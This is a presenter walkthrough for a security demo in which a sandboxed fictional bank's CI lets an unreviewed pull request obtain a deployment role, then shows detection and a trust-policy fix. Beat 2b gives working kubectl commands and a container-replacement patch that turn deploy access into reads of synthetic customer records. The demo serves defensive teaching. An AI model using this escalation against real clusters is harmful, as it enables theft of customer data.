# Presenter walkthrough

Four beats. Almost everything happens in **one GitHub tab**. You only glance elsewhere at the very end.

- **Beat 1** — a legitimate PR. CI goes green, ready to merge.
- **Beat 2** — the attacker. Use the stolen agent's access to open a malicious PR, show it obtains the keys to deploy the bank, then (Beat 2b) ride that identity to synthetic customer data.
- **Beat 3** — turn on the control, attack again, get stopped.
- **Beat 4** — show the evidence: the alert and the AWS record.

> **The one honest framing to say out loud.** Everything here is a fictional bank with invented records in our own AWS sandbox. The attack's pivot is that an **unreviewed PR obtains the AWS identity that can replace the running app**; from there the attacker replaces the app and inherits its data access, and Beat 2b shows real synthetic customer records coming out. The detection fires at the **credential grab** — the earliest link — which is why that is the moment worth catching. Honest caveat to state: a GitHub-hosted PR runner can't reach the private cluster, so the post-grab steps run from an in-VPC position, representing an attacker whose pipeline deploys with cluster access (a common real pattern).

---

## Before the panel arrives (your setup, not shown)

Environment already up (`DEMO.md` → *Stand it up*). Then:

1. One terminal, minimized, running the monitor. You'll glance at it in Beat 4.

   ```powershell
   .venv/Scripts/python.exe -m scripts.demo.login     # once; approve as demo-admin in the browser
   .venv/Scripts/python.exe -m scripts.demo.watch --minutes 120
   ```

2. Confirm detection mode is on (the deliberately-weak trust that lets the attack succeed the first time):

   ```powershell
   .venv/Scripts/python.exe -m scripts.demo.prevent off
   ```

3. Browser: signed in to GitHub on the repo, and one AWS console tab signed in as **`demo-admin`** in **N. Virginia** (for Beat 4, optional).

That's all the setup. During the demo you drive GitHub.

---

## Beat 1 — the legitimate change (~40 seconds)

1. GitHub → **Code** → open `app/release.py` → **pencil / Edit**.
2. Change the text: `RELEASE_NOTE = "hello from the panel"`.
3. **Commit changes** → **Create a new branch** → **Propose changes** → **Create pull request**.
4. Open the **Checks** tab. The PR checks run and go **green**. It's ready to merge.

Say: *"Normal change, normal review. CI ran on GitHub's own machines with no access to AWS. A reviewer would approve and merge, and only then does it deploy."* Merge it if you want the green-tick moment; not required.

---

## Beat 2 — the attacker (~2 minutes)

Say: *"Now I'm the attacker. I phished a junior dev's AI coding-agent token. I can't merge anything, but I can open a PR — and PR tests run before anyone reviews them."*

1. GitHub → **Code** → `scripts/d2/demo_probe.py`. One line: `MARKER = "..."`. Say: *"This stands in for a build/test script. I'm editing it so my code runs in CI."*
2. **Edit** → change the marker to `MARKER = "owned"`.
3. **Commit changes** → **Create a new branch** → **Create pull request**. **Do not merge.**
4. **Checks** tab → open **D2 identity-boundary exercise / identity-probe** → the probe step. Read the JSON:
   - `obtained_identity: …assumed-role/mybank-sandbox-d2-demo-deploy/…` — **the unreviewed PR just obtained the deployment identity.** That's the breach: these are the keys to replace the bank app.
   - `direct_database_read: blocked by IAM` and `reach_private_cluster: blocked by network` — the identity *by itself* can't read data or reach the cluster from a hosted runner. The attacker's real path is to *use it to replace the running app*, shown next.

Say: *"A PR that nobody approved now holds the identity trusted to deploy our banking backend."*

---

## Beat 2b — prove the impact: that identity reaches customer data (~2 minutes)

This is the "so what". Everything is synthetic data in our own sandbox. Run it from **Terminal B** (the tunnel + admin kubeconfig from setup). Detection is still off.

The deploy identity can only `patch` the app's Deployment — but the app's pods run under a service account whose Pod Identity role *can* read the customer tables. So replacing the app's container turns deploy access into data access (the concept's steps 22–24).

1. Show the stolen identity's exact scope — it can ship a deploy, but cannot read the API secret:

   ```powershell
   kubectl auth can-i patch deployment/mybank-api -n mybank --as mybank-deployer --as-group mybank:deployers   # yes
   kubectl auth can-i get secret/mybank-api    -n mybank --as mybank-deployer --as-group mybank:deployers        # no
   ```

2. Acting only as that identity, replace the app container with one that reads the customer tables:

   ```powershell
   @'
   {"spec":{"template":{"spec":{"containers":[{"name":"api","command":["sh","-c","python -c 'import boto3,os,json; c=boto3.client(\"dynamodb\",region_name=os.environ.get(\"AWS_REGION\",\"us-east-1\")); print(\"SYNTHETIC CUSTOMER RECORDS:\"); [print(json.dumps(c.get_item(TableName=os.environ[\"ACCOUNTS_TABLE\"],Key={\"account_id\":{\"S\":a}}).get(\"Item\"))) for a in (\"acct-alice\",\"acct-bob\")]; [print(json.dumps(c.get_item(TableName=os.environ[\"CUSTOMERS_TABLE\"],Key={\"customer_id\":{\"S\":u}}).get(\"Item\"))) for u in (\"cust-alice\",\"cust-bob\")]'; sleep 3600"],"livenessProbe":null,"readinessProbe":null,"startupProbe":null}]}}}}
   '@ | Set-Content -Encoding utf8 .cache/hijack-patch.json

   kubectl -n mybank --as mybank-deployer --as-group mybank:deployers `
     patch deployment mybank-api --type strategic --patch-file .cache/hijack-patch.json
   ```

3. The hijacked pod runs under the app identity and prints the records it read:

   ```powershell
   Start-Sleep 20
   kubectl -n mybank logs -l app.kubernetes.io/name=mybank-api --tail=20
   ```

   Expected: `SYNTHETIC CUSTOMER RECORDS:` followed by the `acct-alice` / `acct-bob` and customer JSON.

   Say: *"Deploy access became customer-data access. In a real org whose pipeline deploys with cluster reach, this whole chain runs from CI. The data step is why obtaining that identity is the moment to catch."*

4. Restore the legitimate app (as the operator):

   ```powershell
   kubectl -n mybank rollout undo deployment/mybank-api
   kubectl -n mybank rollout status deployment/mybank-api
   ```

   If anything looks off, `.venv/Scripts/python.exe -m scripts.demo.up` re-applies the good Deployment.

> Convenience wrapper: `scripts/demo/impact.py` runs steps 1–4. Test it once before the panel; the manual commands above are the reliable fallback.

---

## Beat 3 — turn on the control, attack again, blocked (~1 minute)

1. In a terminal: `.venv/Scripts/python.exe -m scripts.demo.prevent on`
   Say: *"One infrastructure-as-code change: the deploy role now trusts only `main`, never PR jobs."*
2. GitHub → your attacker PR → **Code** on that branch → edit `scripts/d2/demo_probe.py` again (`MARKER = "owned-again"`) → **Commit directly to the branch**.
3. **Checks** → `identity-probe` now **fails**: `AccessDenied … Not authorized to perform sts:AssumeRoleWithWebIdentity`.

Say: *"Same attack. AWS now refuses to hand a PR job the deployment identity."*

---

## Beat 4 — the evidence (~1 minute)

Pick whichever is easier on the day.

- **The monitor terminal** (fastest): it already printed, during Beat 2:
  ```
  pull_request run <N> -> pr_role_misuse
      ALERT (high): Deployment credentials issued to PR validation
  ```
  and during Beat 3: `pull_request run <N2> -> assumption_denied`.
  Say: *"This runs outside GitHub, so the attacker can't silence it. It flagged the grab within about a minute, and logged the blocked retry."*

- **AWS console** (if they want to see it at the source): CloudTrail → **Event history** → filter *Event name* = `AssumeRoleWithWebIdentity`. The successful event is the attack (resource `mybank-sandbox-d2-demo-deploy`); the newest one shows **error `AccessDenied`** — the blocked retry.

**Demo over.** Reset for the next run: `.venv/Scripts/python.exe -m scripts.demo.prevent off`, close the PR without merging.

---

## If something hiccups

| Symptom | Fix |
| --- | --- |
| Monitor silent after Beat 2 | CloudTrail takes a minute or two; wait. Or show CloudTrail Event history directly |
| PR check didn't start | The PR must change `scripts/d2/demo_probe.py` from a branch in this repo |
| `prevent on` then attack still succeeds | IAM needs ~30s to propagate; push the retry commit a moment later |
| `ExpiredToken` / sign-in error | `.venv/Scripts/python.exe -m scripts.demo.login`, then retry |

## Likely questions

| Question | Answer |
| --- | --- |
| Did the attacker get customer data? | Yes — Beat 2b shows synthetic records coming out, by using the deploy identity to replace the app and inherit its data access. The detection fires at the credential grab, before that stage. |
| Could they hide by naming the session "release"? | No. The monitor uses GitHub's signed subject and run record, never the attacker-chosen session name. |
| Why detect if the trust change prevents it? | Defense in depth, and the detector found the gap in the first place. Networks and configs drift; the alert is the early warning. |
| Real-world fix? | Trust deploy roles only from protected `main` (shown live); better, GitOps so CI holds no deploy creds; and scan Terraform for trust policies that admit `pull_request`. |
